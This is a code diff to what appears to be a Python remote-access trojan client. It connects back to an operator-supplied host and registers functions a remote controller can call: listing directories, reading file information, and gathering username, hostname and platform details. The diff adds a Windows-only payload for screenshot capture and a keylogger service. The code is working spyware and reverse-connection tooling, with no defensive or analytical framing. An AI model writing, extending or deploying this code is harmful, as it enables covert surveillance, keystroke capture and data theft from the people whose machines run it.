@@ -2,6 +2,7 @@
 
 import socket
 import socketserver
+import sys
 
 from . import connection
 from . import payload
@@ -90,7 +91,18 @@ if __name__ == '__main__':
     args = parser.parse_args()
     host, port = addr = args.host, args.port
 
-    funcs = [payload.get_username,
+    with ReverseClient(addr) as client:
+        init_payload(client)
+        try:
+            client.serve_forever()
+        except connection.ConnectionClosed:
+            pass
+
+
+def init_payload(client):
+    # TODO: for f in payload.__all__ ...
+    funcs = [
+            payload.get_username,
             payload.get_hostname,
             payload.get_platform,
             payload.list_dir,
@@ -99,14 +111,19 @@ if __name__ == '__main__':
             payload.get_file_size,
             payload.uname,
     ]
+    for f in funcs:
+        client.register_function(f)
+    client.register_instance(FileService())
+    if 'win' in sys.platform:
+        init_windows_payload(client)
 
-    with ReverseClient(addr) as client:
-        for f in funcs:
-            client.register_function(f)
-        client.register_instance(FileService())
-        client.register_instance(payload.KeyloggerService())
-        try:
-            client.serve_forever()
-        except connection.ConnectionClosed:
-            pass
+
+def init_windows_payload(client):
+    # TODO: for f in payload.windows.__all__ ...
+    funcs = [
+            payload.windows.screenshot,
+    ]
+    for f in funcs:
+        client.register_function(f)
+    client.register_instance(payload.windows.KeyloggerService())
 
